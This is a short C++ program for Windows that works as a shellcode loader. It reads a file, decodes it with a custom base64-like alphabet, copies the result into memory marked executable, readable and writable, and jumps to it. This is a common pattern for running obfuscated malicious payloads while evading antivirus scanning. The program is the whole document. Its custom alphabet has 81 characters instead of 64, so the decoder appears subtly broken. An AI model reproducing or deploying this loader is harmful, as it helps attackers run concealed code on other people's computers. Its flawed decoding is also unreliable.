#include <iostream>
#include <windows.h>
#include <fstream>
#include <vector>
namespace augustEncryption
{
    static const std::string custom_base64_chars =
        "!@#$%^&*()-_=+"
        "[]{};:'\",.<>/?"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";

    std::vector<int> create_reverse_custom_base64_lookup()
    {
        std::vector<int> reverse_custom_base64_lookup(256, -1); // 默认值为-1，表示无效字符
        for (size_t i = 0; i < custom_base64_chars.size(); ++i)
        {
            reverse_custom_base64_lookup[static_cast<unsigned char>(custom_base64_chars[i])] = i;
        }
        return reverse_custom_base64_lookup;
    }

    std::string decode(const std::string &encoded)
    {
        static const std::vector<int> reverse_custom_base64_lookup = create_reverse_custom_base64_lookup();
        std::string decoded;
        int val = 0, valb = -8;
        for (unsigned char c : encoded)
        {
            if (c == '`' || c == '|')
                break;
            int index = reverse_custom_base64_lookup[c];
            if (index == -1)
                break;
            val = (val << 6) + index;
            valb += 6;
            if (valb >= 0)
            {
                decoded.push_back(char((val >> valb) & 0xFF));
                valb -= 8;
            }
        }
        return decoded;
    }

}

int main(int argc, const char **argv)
{
    std::string filename{argv[1]};

    std::string outputstring{};

    std::ifstream inputfile{std::ifstream(filename, std::ios::binary)};
    if (!inputfile.is_open())
    {
        std::cout << "Failed to open input file" << std::endl;
        return 1;
    }
    std::string inputstring = std::string((std::istreambuf_iterator<char>(inputfile)), std::istreambuf_iterator<char>());
    inputfile.close();

    outputstring = augustEncryption::decode(inputstring);

    const auto *decryptedData = reinterpret_cast<const unsigned char *>(outputstring.c_str());
    const auto decryptedDataSize = outputstring.size();

    auto mem = VirtualAlloc(NULL, decryptedDataSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (mem == NULL)
    {
        return 1;
    }
    memcpy(mem, decryptedData, decryptedDataSize);
    ((void (*)()) reinterpret_cast<char *>(mem))();
    return 0;
}